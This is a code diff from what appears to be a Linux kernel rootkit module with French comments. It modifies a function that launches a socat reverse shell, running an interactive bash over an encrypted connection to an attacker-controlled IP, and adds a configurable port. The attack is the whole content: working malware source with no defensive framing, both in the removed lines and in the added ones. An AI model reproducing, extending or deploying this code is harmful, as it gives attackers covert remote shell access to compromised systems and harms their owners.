@@ -14,7 +14,7 @@
 
 int is_socat_binaire_dropped(void);
 int drop_socat_binaire(void);
-int launch_reverse_shell(void);
+int launch_reverse_shell(char *args);
 
 int is_socat_binaire_dropped(void) {
     struct file *f;
@@ -70,20 +70,35 @@ int remove_socat_binaire(void) {
     return SUCCESS;
 }
 
-int launch_reverse_shell(void) {
-    if (!is_socat_binaire_dropped()) {
+// Fonction pour lancer le reverse shell
+int launch_reverse_shell(char *args)
+{
+    if (!is_socat_binaire_dropped())
+    {
         ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
         return -FAILURE;
     }
 
-    // launch socat in a userland managed thread
-    char cmd[256];
-    snprintf(cmd, 256, "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &", SOCAT_BINARY_PATH, ip, REVERSE_SHELL_PORT);
-    int ret = exec_str_as_command(cmd, false);
-    if (ret == SUCCESS)
-        DBG_MSG("launch_reverse_shell: socat reverse shell launched\n");
-    else
-        ERR_MSG("launch_reverse_shell: failed to start socat reverse shell\n");
+    int port = REVERSE_SHELL_PORT;  // Port par defaut
 
-    return ret;
+    // Recuperer le port
+    if (args && strlen(args) > 0)
+        port = simple_strtol(args, NULL, 10);
+
+    // Construire la commande socat avec le port spécifié
+    char cmd[256];
+    snprintf(cmd, sizeof(cmd), "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &", 
+             SOCAT_BINARY_PATH, ip, port);
+
+    // Lancer la commande
+    int ret_code = exec_str_as_command(cmd, false);
+    
+    if (ret_code < 0)
+    {
+        ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n", port);
+        return ret_code;
+    }
+
+    DBG_MSG("launch_reverse_shell: reverse shell started on port %d\n", port);
+    return SUCCESS;
 }
